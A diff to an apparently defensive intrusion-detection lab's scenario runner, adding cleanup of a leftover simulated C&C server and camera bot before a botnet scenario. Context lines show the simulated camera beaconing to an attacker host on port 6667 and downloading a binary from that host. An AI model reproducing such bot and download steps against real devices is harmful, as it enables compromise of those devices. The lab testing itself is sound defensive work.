@@ -280,12 +280,21 @@ def run_scenario(n: int, wait: float) -> dict:
         checks.append(("Camera service (NVR -> camera:554, admin -> camera:80) before / after the flood",
                        f"{'up' if before else 'DOWN'} / {'up (comes back)' if after else 'DOWN'}"))
     elif n == 4:
+        # Stop a C&C server or bot left from an earlier run first. Otherwise port 6667 is already
+        # open, the camera never fails before its conversations, and the run is not the scenario
+        # written in the guide (found 11 Nov 2026: a second run gave no block).
+        dexec("ids-lab-attack-server", "pkill", "-f", "lab_server.py --role cnc", check=False)
+        dexec("ids-lab-camera", "pkill", "-f", "camera_sim.py bot", check=False)
+        time.sleep(2)
+        if reach("ids-lab-camera", ATTACKER, 6667):
+            notes.append("WARNING: port 6667 was still open before the run; the result is not valid")
         dexec("ids-lab-attack-server", "python", "-u", "/lab/lab_server.py", "--role", "cnc",
               "--cnc-open-after", "120", detach=True)
         dexec("ids-lab-camera", "python", "-u", "/lab/camera_sim.py", "bot", "--server", ATTACKER,
               "--every", "5", "--session", "30", "--duration", str(int(wait)), detach=True)
         notes.append(f"C&C server opens after 120 s; bot runs {wait:.0f} s")
         time.sleep(wait + 20)
+        dexec("ids-lab-attack-server", "pkill", "-f", "lab_server.py --role cnc", check=False)  # clean up
     elif n == 5:
         r = dexec("ids-lab-camera", "python", "-u", "/lab/camera_sim.py", "download", "--url",
                   f"http://{ATTACKER}/bins/lab_test.x86", "--count", "5", "--every", "20", timeout=300)
